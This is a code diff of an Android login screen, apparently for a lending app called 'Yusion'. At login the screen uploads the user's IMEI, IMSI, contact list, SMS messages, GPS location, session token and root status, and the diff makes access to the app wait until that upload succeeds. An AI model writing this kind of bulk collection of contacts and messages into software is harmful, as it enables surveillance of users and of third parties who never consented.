@@ -39,6 +39,10 @@ import org.json.JSONObject;
 import java.util.ArrayList;
 import java.util.List;
 
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
+
 public class LoginActivity extends BaseActivity {
     public static final int READ_CONTACTS_CODE = 10;
     private EditText mLoginMobileTV;
@@ -133,8 +137,6 @@ public class LoginActivity extends BaseActivity {
             Toast.makeText(LoginActivity.this, "登录成功", Toast.LENGTH_SHORT).show();
             //上传设备信息
             uploadPersonAndDeviceInfo();
-//            startActivity(new Intent(LoginActivity.this, MainActivity.class));
-//            finish();
         }
     }
 
@@ -158,13 +160,16 @@ public class LoginActivity extends BaseActivity {
     }
 
 
-    private void uploadPersonAndDeviceInfo() {
+    private void
+    uploadPersonAndDeviceInfo() {
         ContactPersonInfoReq req = new ContactPersonInfoReq();
         String imei = telephonyManager.getDeviceId();
         String imsi = telephonyManager.getSubscriberId();
         req.imei = imei;
         req.imsi = imsi;
         req.app = "Yusion";
+        req.token = SharedPrefsUtil.getInstance(this).getValue("token", null);
+        req.mobile = SharedPrefsUtil.getInstance(this).getValue("mobile", null);
 
         JSONArray jsonArray = MobileDataUtil.getUserData(this, "contact");
         List<ContactPersonInfoReq.DataBean.ContactListBean> list = new ArrayList<>();
@@ -210,7 +215,6 @@ public class LoginActivity extends BaseActivity {
                     smsListBean.type = "snd";
                     smsListBean.ts = jsonObject.optString("time");
                 }
-
                 smsList.add(smsListBean);
             } catch (JSONException e) {
                 e.printStackTrace();
@@ -222,8 +226,6 @@ public class LoginActivity extends BaseActivity {
 
         req.gps.latitude = SharedPrefsUtil.getInstance(this).getValue("latitude", "");
         req.gps.longitude = SharedPrefsUtil.getInstance(this).getValue("longitude", "");
-        Log.e("sssss", req.gps.latitude);
-        Log.e("ssssss", req.gps.longitude);
         req.data.mobile = SharedPrefsUtil.getInstance(this).getValue("mobile", "0");
         req.sms.mobile = SharedPrefsUtil.getInstance(this).getValue("mobile", "0");
         req.system = "android";
@@ -234,6 +236,7 @@ public class LoginActivity extends BaseActivity {
         req.os_version = SharedPrefsUtil.getInstance(this).getValue("release", "");
         req.factory = SharedPrefsUtil.getInstance(this).getValue("factory", "");
         req.model = SharedPrefsUtil.getInstance(this).getValue("model", "");
+        req.rooted = MobileDataUtil.hasRoot();
         req.data.action = "contact";
 
         AuthApi.checkUserInfo(this, new OnItemDataCallBack<CheckUserInfoResp>() {
@@ -241,13 +244,25 @@ public class LoginActivity extends BaseActivity {
             public void onItemDataCallBack(CheckUserInfoResp data) {
                 req.data.clt_nm = data.name;
                 req.sms.clt_nm = data.name;
-                PersonApi.uploadPersonAndDeviceInfo(req);
+                //PersonApi.uploadPersonAndDeviceInfo(req);
+                PersonApi.uploadPersonAndDeviceInfo(req, new Callback() {
+                    @Override
+                    public void onResponse(Call call, Response response) {
+                        Intent intent = new Intent(LoginActivity.this, MainActivity.class);
+                        startActivity(intent);
+                        finish();
+                    }
+
+                    @Override
+                    public void onFailure(Call call, Throwable t) {
+
+                    }
+                });
             }
         });
-
-        Intent intent = new Intent(LoginActivity.this, MainActivity.class);
-        startActivity(intent);
-        finish();
+//        Intent intent = new Intent(LoginActivity.this, MainActivity.class);
+//        startActivity(intent);
+//        finish();
     }
 
 }
